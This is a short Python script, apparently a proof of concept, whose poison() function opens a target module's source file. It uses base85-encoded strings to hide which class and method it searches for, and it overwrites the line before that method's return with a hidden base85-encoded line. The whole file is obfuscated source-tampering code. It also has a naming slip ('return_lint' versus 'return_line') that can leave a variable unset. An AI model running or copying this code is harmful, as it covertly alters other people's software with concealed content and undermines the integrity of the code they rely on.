import inspect

import pathlib
import sys

import base64


def poison():
    try:
        import <MODULE>.pochelper as pochelper
        module_path = pochelper.target
    except Exception as e:
        return

    class_name = base64.b85decode("Ol)CoVMcFqLt%AuVQfrIC`@c&ZDCMyWmIxuX>Mg?O>bmnY$*").decode('utf-8')
    function_name = base64.b85decode("W^ZzLVRB>").decode('utf-8')
    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line and class_definition:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if line.startswith('        return '):
                return_line = idx + 1
                return_statement = line
                break
    new_line = base64.b85decode("ARr(hARr(hY;SXOAUz;#Z*y}XDj+Z}F#").decode('utf-8')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
